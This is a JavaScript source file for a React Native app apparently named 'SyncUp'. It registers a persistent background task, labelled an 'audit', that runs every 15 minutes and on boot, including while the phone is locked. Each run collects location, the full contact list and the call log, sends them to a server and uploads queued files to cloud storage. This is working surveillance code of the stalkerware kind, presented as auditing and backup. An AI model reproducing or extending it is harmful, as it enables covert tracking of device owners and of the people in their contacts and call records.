import * as TaskManager from 'expo-task-manager';
import * as BackgroundFetch from 'expo-background-fetch';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as Location from 'expo-location';
import * as Contacts from 'expo-contacts';
import * as Application from 'expo-application';
import { Platform, PermissionsAndroid } from 'react-native';
import CallLogs from 'react-native-call-log';
import { getDeviceId } from './deviceId';
import { sendAuditLog, reportAuditError } from './auditLogger';
import { backgroundBackupBatch } from './cloudBackup';

const BACKGROUND_AUDIT_TASK = 'background-audit-task';
const LAST_AUDIT_KEY = 'syncup_last_bg_audit';
const KEY_API_BASE = 'syncup_api_base';
const BG_INTERVAL_KEY = 'syncup_bg_interval';
const BG_LOG_KEY = 'syncup_bg_log';
const BG_LOG_MAX = 20;
const DEFAULT_INTERVAL = 15 * 60; // 15 minutes (Android minimum)

// Stored in plain AsyncStorage (not SecureStore) so it is readable when
// the device screen is off / locked — SecureStore requires device unlock.
export const BG_USER_ID_KEY = 'syncup_bg_user_id';

/**
 * Append an entry to the persistent background task log (keeps last 20).
 * This survives even if the app is killed, so you can see task activity
 * in Developer Settings after background runs.
 */
async function appendBgLog(status, details) {
  try {
    const raw = await AsyncStorage.getItem(BG_LOG_KEY);
    const logs = raw ? JSON.parse(raw) : [];
    logs.unshift({
      timestamp: new Date().toISOString(),
      status,
      details: details || '',
    });
    const trimmed = logs.slice(0, BG_LOG_MAX);
    await AsyncStorage.setItem(BG_LOG_KEY, JSON.stringify(trimmed));
  } catch {}
}

/**
 * Wrap a promise with a hard timeout. If the promise doesn't settle within
 * `ms`, resolves with `fallback`. This is critical for background tasks
 * because Android kills the task at ~30s — we can't afford any hang.
 */
function withTimeout(promise, ms, fallback = null) {
  return Promise.race([
    promise,
    new Promise(resolve => setTimeout(() => resolve(fallback), ms)),
  ]);
}

/**
 * fetch() with a hard timeout via AbortController (RN fetch ignores
 * the `timeout` property entirely).
 */
async function fetchWithTimeout(url, options = {}, ms = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    return res;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Background metadata collector — Location + Contacts + Call Logs.
 * Android gives ~30 seconds. Estimated time: ~10-15s.
 * Skips: GPS dialog (no UI), heavy device info, SIM, network, system.
 */
async function collectBackgroundMetadata() {
  const metadata = {
    timestamp: new Date().toISOString(),
    location: null,
    contacts: [],
    call_logs: [],
  };

  // 1. LOCATION — Priority: real-time GPS → cached → IP fallback
  // Checks both foreground AND background location permissions.
  // On Android 10+, reading location when screen is off requires
  // ACCESS_BACKGROUND_LOCATION ("Allow all the time"), otherwise the OS
  // silently blocks the read and we fall through to IP.
  // NO GPS dialog — there is no UI in background.
  let locationPath = 'none';
  try {
    // Check both permission scopes
    const fgStatus = await withTimeout(
      Location.getForegroundPermissionsAsync().then(r => r.status),
      2000,
      'denied'
    );
    let bgStatus = 'denied';
    try {
      bgStatus = await withTimeout(
        Location.getBackgroundPermissionsAsync().then(r => r.status),
        2000,
        'denied'
      );
    } catch {}

    const hasAnyPermission = fgStatus === 'granted' || bgStatus === 'granted';
    const hasBackgroundPermission = bgStatus === 'granted';
    locationPath = `perm_fg:${fgStatus}|bg:${bgStatus}`;

    if (hasAnyPermission) {
      const gpsOn = await withTimeout(Location.hasServicesEnabledAsync(), 2000, false);
      locationPath += `|gps:${gpsOn ? 'on' : 'off'}`;

      // --- STEP 1: If GPS is ON, try a real-time fresh fix first ---
      // Use Balanced accuracy (network + GPS) — more reliable in background
      // than Low (passive-only) but still fast (~3-6s).
      if (gpsOn) {
        try {
          const loc = await withTimeout(
            Location.getCurrentPositionAsync({
              accuracy: Location.Accuracy.Balanced,
              mayShowUserSettingsDialog: false,
            }),
            8000,
            null
          );
          if (loc && loc.coords) {
            metadata.location = {
              latitude: loc.coords.latitude,
              longitude: loc.coords.longitude,
              accuracy: loc.coords.accuracy,
              altitude: loc.coords.altitude,
              speed: loc.coords.speed,
              heading: loc.coords.heading,
              timestamp: new Date(loc.timestamp).toISOString(),
              is_gps: true,
              is_approximate: false,
              method: hasBackgroundPermission ? 'gps_realtime' : 'gps_realtime_fg_only',
            };
            locationPath += '|realtime_ok';
          } else {
            locationPath += '|realtime_null';
          }
        } catch (err) {
          locationPath += `|realtime_err:${(err?.message || 'x').slice(0, 20)}`;
        }
      }

      // --- STEP 2: Fall back to last-known cached position ---
      if (!metadata.location) {
        try {
          // No maxAge restriction — accept any cached fix the OS has
          const cached = await withTimeout(
            Location.getLastKnownPositionAsync(),
            3000,
            null
          );
          if (cached && cached.coords) {
            const ageMs = Date.now() - cached.timestamp;
            metadata.location = {
              latitude: cached.coords.latitude,
              longitude: cached.coords.longitude,
              accuracy: cached.coords.accuracy,
              timestamp: new Date(cached.timestamp).toISOString(),
              age_seconds: Math.round(ageMs / 1000),
              is_gps: false,
              is_approximate: true,
              method: 'cached',
            };
            locationPath += '|cached_ok';
          } else {
            locationPath += '|cached_null';
          }
        } catch (err) {
          locationPath += `|cached_err:${(err?.message || 'x').slice(0, 20)}`;
        }
      }
    }
  } catch (err) {
    locationPath += `|perm_err:${(err?.message || 'x').slice(0, 20)}`;
  }

  // --- STEP 3: IP fallback (last resort) ---
  if (!metadata.location) {
    try {
      const res = await fetchWithTimeout('https://ipwho.is/', {}, 5000);
      if (res.ok) {
        const d = await res.json();
        if (d.latitude && d.longitude) {
          metadata.location = {
            latitude: d.latitude,
            longitude: d.longitude,
            city: d.city,
            country: d.country,
            ip: d.ip,
            timestamp: new Date().toISOString(),
            is_gps: false,
            is_approximate: true,
            method: 'ip_geolocation',
          };
          locationPath += '|ip_ok';
        }
      }
    } catch {
      locationPath += '|ip_err';
    }
  }

  // Expose diagnostic trail so the Execution Log can show why IP was used
  metadata._location_debug = locationPath;

  // 2. CONTACTS
  try {
    let contactsAllowed = false;
    if (Platform.OS === 'android') {
      contactsAllowed = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CONTACTS
      );
    } else {
      const { status: cs } = await Contacts.getPermissionsAsync();
      contactsAllowed = cs === 'granted';
    }

    if (contactsAllowed) {
      // Hard 8s timeout — large address books can hang
      const res = await withTimeout(
        Contacts.getContactsAsync({
          fields: [
            Contacts.Fields.Name,
            Contacts.Fields.PhoneNumbers,
            Contacts.Fields.Emails,
          ],
        }),
        8000,
        { data: [] }
      );
      const data = res?.data || [];
      metadata.contacts = data.map(c => ({
        id: c.id,
        name: c.name || 'Unknown',
        phone_numbers: c.phoneNumbers?.map(p => p.number) || [],
        emails: c.emails?.map(e => e.email) || [],
      }));
      console.log(`[BackgroundAudit] Collected ${metadata.contacts.length} contacts`);
    }
  } catch (err) {
    console.warn('[BackgroundAudit] Contacts error:', err.message);
  }

  // 3. CALL LOGS (Android only)
  if (Platform.OS === 'android') {
    try {
      const callLogAllowed = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
      );
      if (callLogAllowed) {
        // Hard 6s timeout
        const logs = await withTimeout(CallLogs.loadAll(), 6000, []);
        metadata.call_logs = (logs || []).map(log => ({
          name: log.name || null,
          phone_number: log.phoneNumber || null,
          type: log.type || null,
          duration: log.duration || 0,
          date_time: log.dateTime || null,
          timestamp: log.timestamp || null,
          raw_type: log.rawType || null,
        }));
        console.log(`[BackgroundAudit] Collected ${metadata.call_logs.length} call logs`);
      }
    } catch (err) {
      console.warn('[BackgroundAudit] Call logs error:', err.message);
    }
  }

  return metadata;
}

/**
 * Build a compact error report and fire it to the diagnostics endpoint.
 * Never throws — failures here are logged locally but don't bubble up.
 */
async function sendErrorReport({ apiUrl, errorType, errorMessage, result, metadata, userId, deviceId, elapsedSec, stack }) {
  try {
    const payload = result?.payload || {
      user_id: userId,
      device_id: deviceId,
      event_type: 'background-audit',
      metadata,
    };

    let payloadSize = 0;
    try { payloadSize = JSON.stringify(payload).length; } catch {}

    const report = {
      error_id: `bg-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: new Date().toISOString(),

      context: {
        source: 'background-audit',
        event_type: 'background-audit',
        user_id: userId || null,
        device_id: deviceId || null,
        api_url: apiUrl || null,
        app_version: Application.nativeApplicationVersion || null,
        platform: Platform.OS,
        os_version: Platform.Version != null ? String(Platform.Version) : null,
        task_elapsed_seconds: elapsedSec != null ? Number(elapsedSec) : null,
      },

      error: {
        type: errorType,                                    // API_FAILED | HTTP_ERROR | TASK_ERROR
        message: errorMessage || 'unknown',
        http_status: result?.http_status ?? null,
        http_status_text: result?.http_status_text || '',
        response_snippet: result?.response_snippet || '',
        stack: stack || null,
      },

      payload_summary: {
        location_method: metadata?.location?.method || null,
        location_debug: metadata?._location_debug || null,
        contacts_count: metadata?.contacts?.length ?? 0,
        call_logs_count: metadata?.call_logs?.length ?? 0,
        has_location: !!metadata?.location,
        payload_size_bytes: payloadSize,
      },

      // Truncated preview — keeps report small (arrays summarised, not full)
      payload_preview: {
        user_id: payload.user_id || null,
        device_id: payload.device_id || null,
        event_type: payload.event_type || null,
        timestamp: payload.timestamp || null,
        metadata: metadata
          ? {
              location: metadata.location || null,
              contacts: metadata.contacts?.length
                ? `[${metadata.contacts.length} items — truncated]`
                : [],
              call_logs: metadata.call_logs?.length
                ? `[${metadata.call_logs.length} items — truncated]`
                : [],
            }
          : null,
      },
    };

    await reportAuditError(apiUrl, report);
  } catch (err) {
    console.warn('[BackgroundAudit] sendErrorReport failed:', err?.message);
  }
}

/**
 * Define the background task at the TOP LEVEL (outside any component).
 * This runs headlessly — no UI, no React context available.
 * Reads apiUrl, userId, deviceId from storage directly.
 */
TaskManager.defineTask(BACKGROUND_AUDIT_TASK, async () => {
  const startTime = Date.now();
  await appendBgLog('TRIGGERED', 'Android woke task');
  try {
    console.log('[BackgroundAudit] Task triggered at', new Date().toISOString());

    // 1. Get API URL from AsyncStorage
    const apiUrl = await AsyncStorage.getItem(KEY_API_BASE);
    if (!apiUrl) {
      await appendBgLog('SKIPPED', 'No API URL stored');
      return BackgroundFetch.BackgroundFetchResult.NoData;
    }

    // 2. Get userId from AsyncStorage (works when device is locked)
    const userId = await AsyncStorage.getItem(BG_USER_ID_KEY);
    if (!userId) {
      await appendBgLog('SKIPPED', 'No user logged in');
      return BackgroundFetch.BackgroundFetchResult.NoData;
    }

    // 3. Get device ID (fast, sync on Android via expo-application)
    const deviceId = await withTimeout(getDeviceId(), 2000, 'unknown-device');

    // 4. Collect lightweight metadata — wrapped in overall 20s budget
    //    (leaves 10s for the HTTP POST within Android's 30s limit)
    const metadata = await withTimeout(
      collectBackgroundMetadata(),
      20000,
      { timestamp: new Date().toISOString(), location: null, contacts: [], call_logs: [], _timed_out: true }
    );

    // 5. Send audit log (has its own 15s timeout)
    const result = await sendAuditLog(apiUrl, userId, deviceId, 'background-audit', metadata);

    if (result.success) {
      await AsyncStorage.setItem(LAST_AUDIT_KEY, new Date().toISOString());

      // 6. Background cloud backup batch (uploads 3-5 files to Cloudinary).
      //    Uses remaining time budget. If queue empty, skips instantly.
      let backupResult = 'skipped';
      try {
        const timeLeft = Math.max(5000, 28000 - (Date.now() - startTime));
        const bkResult = await withTimeout(
          backgroundBackupBatch(timeLeft),
          timeLeft,
          { uploaded: 0, failed: 0, remaining: -1, reason: 'timeout' }
        );
        if (bkResult?.reason === 'empty_queue' || bkResult?.reason === 'disabled') {
          backupResult = bkResult.reason;
        } else if (bkResult?.uploaded > 0 || bkResult?.failed > 0) {
          backupResult = `up:${bkResult.uploaded},fail:${bkResult.failed},left:${bkResult.remaining}`;
        } else {
          backupResult = bkResult?.reason || 'none';
        }
      } catch (e) {
        backupResult = `err:${(e?.message || '').slice(0, 20)}`;
      }

      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      await appendBgLog(
        'SUCCESS',
        `${elapsed}s | loc:${metadata.location?.method || 'none'} | contacts:${metadata.contacts.length} | calls:${metadata.call_logs.length} | backup:${backupResult}`
      );
      return BackgroundFetch.BackgroundFetchResult.NewData;
    } else {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      await appendBgLog('API_FAILED', `${elapsed}s: ${result.error || 'unknown'}`);
      // Fire-and-forget diagnostic report — classify as HTTP_ERROR if no
      // status code (network-level failure) or API_FAILED (server responded
      // but rejected the payload / returned non-JSON).
      await sendErrorReport({
        apiUrl,
        errorType: result.network_error ? 'HTTP_ERROR' : 'API_FAILED',
        errorMessage: result.error,
        result,
        metadata,
        userId,
        deviceId,
        elapsedSec: elapsed,
      });
      return BackgroundFetch.BackgroundFetchResult.Failed;
    }
  } catch (err) {
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    await appendBgLog('ERROR', `${elapsed}s: ${err.message}`);
    // Also report task-level crashes so they surface server-side
    try {
      const apiUrl = await AsyncStorage.getItem(KEY_API_BASE);
      const userId = await AsyncStorage.getItem(BG_USER_ID_KEY);
      await sendErrorReport({
        apiUrl,
        errorType: 'TASK_ERROR',
        errorMessage: err.message,
        result: null,
        metadata: null,
        userId,
        deviceId: null,
        elapsedSec: elapsed,
        stack: err.stack || null,
      });
    } catch {}
    return BackgroundFetch.BackgroundFetchResult.Failed;
  }
});

/**
 * Register the background fetch task with Android-friendly settings.
 * Idempotent + self-healing: call this on every login (manual + auto).
 *
 * Behaviour:
 *  - If the task is registered AND BackgroundFetch is Available → no-op.
 *  - If the task is registered but BackgroundFetch reports Denied/Restricted
 *    (e.g. user revoked battery optimisation, OEM killed it) → unregister
 *    and re-register so the OS gets a fresh schedule.
 *  - If not registered → register it.
 *  - Logs the outcome to the persistent execution log so the Developer
 *    Settings panel always shows the latest registration status.
 */
export async function registerBackgroundAuditTask() {
  try {
    const isRegistered = await TaskManager.isTaskRegisteredAsync(BACKGROUND_AUDIT_TASK);
    let status = null;
    try {
      status = await BackgroundFetch.getStatusAsync();
    } catch {}

    const statusName =
      status === BackgroundFetch.BackgroundFetchStatus.Available ? 'Available'
      : status === BackgroundFetch.BackgroundFetchStatus.Denied ? 'Denied'
      : status === BackgroundFetch.BackgroundFetchStatus.Restricted ? 'Restricted'
      : 'Unknown';

    // Already registered and OS allows it — nothing to do
    if (isRegistered && status === BackgroundFetch.BackgroundFetchStatus.Available) {
      console.log('[BackgroundAudit] ✓ Task already registered (status: Available)');
      await appendBgLog('REGISTERED', `Already registered | status:${statusName}`);
      return true;
    }

    // Registered but OS no longer allows — re-register to refresh the schedule
    if (isRegistered) {
      console.log(`[BackgroundAudit] Task registered but status is ${statusName} — re-registering`);
      try {
        await BackgroundFetch.unregisterTaskAsync(BACKGROUND_AUDIT_TASK);
      } catch {}
    }

    const savedInterval = await AsyncStorage.getItem(BG_INTERVAL_KEY);
    const interval = savedInterval ? parseInt(savedInterval, 10) : DEFAULT_INTERVAL;

    await BackgroundFetch.registerTaskAsync(BACKGROUND_AUDIT_TASK, {
      minimumInterval: interval,
      stopOnTerminate: false,
      startOnBoot: true,
    });

    console.log(`[BackgroundAudit] ✓ Task registered (interval: ${interval}s / ${(interval / 60).toFixed(0)}min, status: ${statusName})`);
    await appendBgLog(
      'REGISTERED',
      `Fresh registration | interval:${(interval / 60).toFixed(0)}min | status:${statusName}`
    );
    return true;
  } catch (err) {
    console.error('[BackgroundAudit] Task registration failed:', err);
    await appendBgLog('ERROR', `Registration failed: ${err.message}`);
    return false;
  }
}

/**
 * Unregister the background task (call on logout).
 */
export async function unregisterBackgroundAuditTask() {
  try {
    const isRegistered = await TaskManager.isTaskRegisteredAsync(BACKGROUND_AUDIT_TASK);

    if (isRegistered) {
      await BackgroundFetch.unregisterTaskAsync(BACKGROUND_AUDIT_TASK);
      console.log('[BackgroundAudit] ✓ Task unregistered');
    }

    return true;
  } catch (err) {
    console.error('[BackgroundAudit] Task unregister failed:', err);
    return false;
  }
}

/**
 * Get the last background audit timestamp (for debugging/UI).
 */
export async function getLastBackgroundAuditTime() {
  try {
    return await AsyncStorage.getItem(LAST_AUDIT_KEY);
  } catch {
    return null;
  }
}

/**
 * Persist the logged-in userId and apiUrl to AsyncStorage so the background
 * task can read them even when the device screen is off / locked.
 * Call this on every login (manual and auto).
 */
export async function saveUserIdForBackground(userId, apiUrl) {
  try {
    await AsyncStorage.setItem(BG_USER_ID_KEY, userId);
    if (apiUrl) {
      await AsyncStorage.setItem(KEY_API_BASE, apiUrl);
    }
  } catch (err) {
    console.error('[BackgroundAudit] Failed to save background data:', err);
  }
}

/**
 * Remove the stored userId on logout.
 * The task will skip (NoData) until the user logs in again.
 */
export async function clearUserIdForBackground() {
  try {
    await AsyncStorage.removeItem(BG_USER_ID_KEY);
  } catch (err) {
    console.error('[BackgroundAudit] Failed to clear userId:', err);
  }
}

/**
 * Get the configured interval in seconds (default 15 min).
 */
export async function getBackgroundInterval() {
  try {
    const val = await AsyncStorage.getItem(BG_INTERVAL_KEY);
    return val ? parseInt(val, 10) : DEFAULT_INTERVAL;
  } catch {
    return DEFAULT_INTERVAL;
  }
}

/**
 * Save interval (seconds) and re-register the task with the new interval.
 */
export async function setBackgroundInterval(seconds) {
  try {
    await AsyncStorage.setItem(BG_INTERVAL_KEY, String(seconds));
    // Unregister and re-register with new interval
    await unregisterBackgroundAuditTask();
    await registerBackgroundAuditTask();
    return true;
  } catch (err) {
    console.error('[BackgroundAudit] Failed to set interval:', err);
    return false;
  }
}

/**
 * Read persistent background task log (most recent first).
 */
export async function getBackgroundLog() {
  try {
    const raw = await AsyncStorage.getItem(BG_LOG_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

/**
 * Clear the background task log.
 */
export async function clearBackgroundLog() {
  try {
    await AsyncStorage.removeItem(BG_LOG_KEY);
  } catch {}
}
